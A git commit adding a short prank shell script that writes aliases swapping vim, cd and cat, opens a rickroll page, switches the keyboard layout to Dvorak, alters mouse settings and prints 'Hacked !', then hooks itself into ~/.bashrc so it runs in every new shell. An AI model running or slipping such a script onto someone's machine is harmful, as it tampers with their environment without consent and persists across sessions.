75a8998657083ce9d21c834ecb8c5b5e1e008184
Manfred Touron <m@42.am>
2015-09-07 21:36:33 +0200

    Added loose.sh

---
+++ loose.sh
@@ -0,0 +1,17 @@
+#!/bin/sh
+
+
+cat <<EOF >> ~/.loose
+alias vim=emacs
+alias cd=ls
+alias cat=cd
+
+google-chrome rickroll.fr   2&>/dev/null
+setxkbmap dvorak            2&>/dev/null
+xset mouse 3 0              2&>/dev/null
+echo "Hacked !"
+EOF
+
+echo ". ~/.loose" >> ~/.bashrc
+
+. ~/.loose
